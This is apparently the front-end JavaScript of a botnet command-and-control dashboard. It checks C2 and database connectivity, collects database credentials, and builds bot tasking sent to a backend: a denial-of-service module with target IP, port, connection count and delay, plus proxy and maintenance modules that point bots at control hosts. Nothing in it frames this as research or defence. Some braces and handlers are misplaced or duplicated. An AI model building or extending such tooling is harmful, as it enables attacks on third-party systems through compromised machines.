  // === DB STATUS ===
  async function updateDBStatus() {
    try {
      const res = await fetch('/api/status/db');
      const data = await res.json();

      const pill = document.querySelector('.status-field:nth-child(3) .pill');
      if (data.mariadb && data.mongodb) {
        pill.className = 'pill pill-connected';
        pill.textContent = 'Connected';
      } else {
        pill.className = 'pill pill-offline';
        pill.textContent = 'Offline';
      }
    } catch (err) {
      console.error("DB status error", err);
    }
  }

  // === C2 STATUS ===
  async function updateC2Status() {
    try {
      const res = await fetch('/api/status/c2');
      const { c2 } = await res.json();
      const c2Pill = document.querySelector('.status-field:nth-child(2) .pill');
      c2Pill.className = 'pill ' + (c2 ? 'pill-connected' : 'pill-offline');
      c2Pill.textContent = c2 ? 'Connected' : 'Offline';
    } catch (e) {
      console.error('C2 status check failed:', e);
    }
  }

 window.showCustomAlert = (message) => {
  const alertBox = document.getElementById('custom-alert');
  const alertMessage = document.getElementById('custom-alert-message');
  alertMessage.textContent = message;
  alertBox.classList.remove('hidden');
}

window.closeCustomAlert = () => {
  document.getElementById('custom-alert').classList.add('hidden');
}

  // === MODAL LOGIC ===
  window.openModal = () => {
    document.getElementById('settings-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeModal = () => {
    document.getElementById('settings-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
  };

  window.saveSettings = () => {
    const instructionsPath = document.getElementById('instructions-path').value;
    const maria = document.getElementById('mariadb-path').value;
    const mongo = document.getElementById('mongo-path').value;
    const c2 = document.getElementById('c2-path').value;
    window.localStorage.setItem('instructionsPath', instructionsPath);
    console.log("Saved paths:", { maria, mongo, c2 });
    closeModal();
  };

  // === INIT ===
  window.addEventListener('DOMContentLoaded', () => {
    updateDBStatus();
    updateC2Status();
    setInterval(updateDBStatus, 10000);
    setInterval(updateC2Status, 10000);
  });

  // === DATABASE MODAL LOGIC ===
  window.openDBModal = () => {
    document.getElementById('db-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeDBModal = () => {
    document.getElementById('db-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
  };

  window.saveDBSettings = () => {
    const maria = {
    server: document.getElementById('maria-server').value,
    port: document.getElementById('maria-port').value,
    database: document.getElementById('maria-database').value,
    user: document.getElementById('maria-user').value,
    password: document.getElementById('maria-password').value,
    disableSSL: document.getElementById('maria-disable-ssl').value
  };

  const mongo = {
    general: {
      host: document.getElementById('mongo-host').value,
      port: document.getElementById('mongo-port').value,
      uri: document.getElementById('mongo-uri').value,
      init_token: document.getElementById('mongo-init-token').value
    },
    server_configs: {
      name: document.getElementById('mongo-server-name').value,
      collection: document.getElementById('mongo-server-collection').value
    },
    bot_configs: {
      name: document.getElementById('mongo-bot-name').value,
      collection: document.getElementById('mongo-bot-collection').value
    },
    bot_instructions: {
      name: document.getElementById('mongo-instr-name').value,
      collection: document.getElementById('mongo-instr-collection').value
    }
  };


  console.log("MariaDB Settings:", maria);
  console.log("MongoDB Settings:", mongo);
  };

  // TODO: Save to backend or localStorage
  closeDBModal();

  window.openInstructionsModal = () => {
    document.getElementById('instructions-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeInstructionsModal = () => {
    document.getElementById('instructions-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
  };

  window.saveInstructions = async () => {
  const instructions = {};

  // Denial of Service
  if (document.getElementById('dos-target-ip').value)
    instructions.dos = {
      _id: "dos_instructions",
      execution_time: "now",
      module: "dos",
      until: "2025-12-31T23:59:59",
      parameters: {
        target_ip: document.getElementById('dos-target-ip').value,
        target_port: parseInt(document.getElementById('dos-target-port').value),
        connection_count: parseInt(document.getElementById('dos-conn-count').value),
        delay_ms: parseInt(document.getElementById('dos-delay').value)
      }
    };

  // Initial
  if (document.getElementById('init-sleep').value)
    instructions.init = {
      _id: "init_instructions",
      module: "control",
      sleep: document.getElementById('init-sleep').value
    };

  // Proxy
  if (document.getElementById('proxy-host').value)
    instructions.proxy = {
      execution_time: "now",
      module: "proxy",
      until: "2025-12-31T23:59:59",
      parameters: {
        c2_host: document.getElementById('proxy-host').value,
        c2_port: parseInt(document.getElementById('proxy-port').value)
      }
    };

  // Maintenance
  if (document.getElementById('maintenance-modules').value)
    instructions.maintenance = {
      modules: document.getElementById('maintenance-modules').value.split(',').map(s => s.trim()),
      connection: {
        command: {
          address: document.getElementById('cmd-addr').value,
          port: parseInt(document.getElementById('cmd-port').value)
        },
        control: {
          address: document.getElementById('ctrl-addr').value,
          port: parseInt(document.getElementById('ctrl-port').value)
        },
        data: {
          address: document.getElementById('data-addr').value,
          port: parseInt(document.getElementById('data-port').value)
        }
      },
      files: {
        certificate: document.getElementById('maintenance-cert').value
      }
    };

  console.log("Instructions to save:", instructions);

  await fetch('/api/instructions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(instructions)
  });

  closeInstructionsModal();
  };

  document.getElementById("json-file-input").addEventListener("change", function (event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function (e) {
            try {
                const jsonData = JSON.parse(e.target.result);
                const formatted = JSON.stringify(jsonData, null, 2);
                document.getElementById("json-editor").value = formatted;
            } catch (err) {
                showCustomAlert("⚠️ Invalid JSON file.");
                console.error(err);
            }
        };
        reader.readAsText(file);
    }
});


  window.loadJSONEditor = () => {
    document.getElementById('instruction-form').style.display = 'none';
    document.getElementById('json-editor-section').style.display = 'block';
  };
  
  window.closeJSONEditor = () => {
    document.getElementById('instruction-form').style.display = 'block';
    document.getElementById('json-editor-section').style.display = 'none';
  };
  
  window.saveJSONEditor = () => {
    const jsonContent = document.getElementById('json-editor').value;
    const parsed = JSON.parse(jsonContent);

    // First, request the config to get the path
    fetch('/get-instruction-path')
        .then(res => res.json())
        .then(config => {
            const targetPath = config.instructions_path;
            if (!targetPath) return showCustomAlert("Instructions path not set!");

            fetch('/save-instruction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    filename: 'update_instructions.json',
                    content: parsed,
                    targetPath
                })
            })
            .then(res => res.json())
            .then(result => {
                showCustomAlert('✅ File saved to: ' + result.path);
            })
            .catch(err => {
                console.error('Error saving file:', err);
                showCustomAlert('❌ Save failed');
            });
        });
  
  document.getElementById('json-file-input').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;
  
    lastOpenedFilePath = `/instructions/${file.name}`;
  
    const text = await file.text();
    document.getElementById('json-editor').value = text;
  });
  
  window.saveSettings = () => {
    const settings = {
        mariadb_path: document.getElementById('mariadb-path').value,
        mongodb_path: document.getElementById('mongodb-path').value,
        c2_path: document.getElementById('c2-path').value,
        instructions_path: document.getElementById('instructions-path').value
    };

    fetch('/save-settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            showCustomAlert('✅ ' + data.message);
        } else {
            showCustomAlert('❌ ' + data.message);
        }
    })
    .catch(err => {
        console.error('Save settings failed:', err);
        showCustomAlert('❌ Failed to contact server.');
    });
}

};
